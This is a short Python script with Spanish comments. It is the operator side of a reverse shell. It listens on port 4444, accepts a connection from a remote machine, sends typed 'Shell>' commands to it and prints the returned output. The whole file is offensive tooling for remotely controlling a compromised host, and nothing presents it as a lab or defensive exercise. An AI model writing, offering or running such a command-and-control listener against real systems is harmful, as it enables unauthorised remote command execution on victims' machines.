import socket

HOST = "0.0.0.0"  # Acepta conexiones desde la misma red
PORT = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

print(f"Esperando conexión en {HOST}:{PORT}...")

client, addr = server.accept()
print(f"Conexión establecida con {addr}")

while True:
    command = input("Shell> ")
    if command.lower() == "exit":
        client.send(b"exit")
        break
    
    client.send(command.encode("utf-8"))
    output = client.recv(4096).decode("utf-8")
    print(output)

client.close()
